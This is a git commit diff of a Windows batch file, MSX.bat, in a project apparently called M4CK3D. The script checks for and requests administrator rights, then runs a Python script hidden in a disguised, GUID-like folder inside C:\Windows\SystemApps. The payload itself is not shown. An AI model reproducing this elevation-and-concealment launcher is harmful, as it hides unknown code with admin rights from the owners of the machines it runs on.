b2b9e218faaa67379ae0bae76f0a8fe35de678dc
aiantics <98560497+aiantics@users.noreply.github.com>
2024-04-25 20:10:18 -0700

    Update MSX.bat

--- M4CK3D/MSX.bat
+++ M4CK3D/MSX.bat
@@ -1,5 +1,4 @@
 @echo off
-:: BatchGotAdmin
 :-------------------------------------
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 if '%errorlevel%' NEQ '0' (
@@ -14,10 +13,6 @@ if '%errorlevel%' NEQ '0' (
     exit /B
 
 :gotAdmin
-:: End BatchGotAdmin
-
-set "userprofilepath=%userprofile%"
-for %%F in ("%userprofilepath%") do set "username=%%~nxF"
 
 python "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\pris\NFAH\_YE12842D-71D7-4477-A44B-7FA65F11C153\MSAS\MS.py"
 cd "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\pris\NFAH\_YE12842D-71D7-4477-A44B-7FA65F11C153\MSAS"
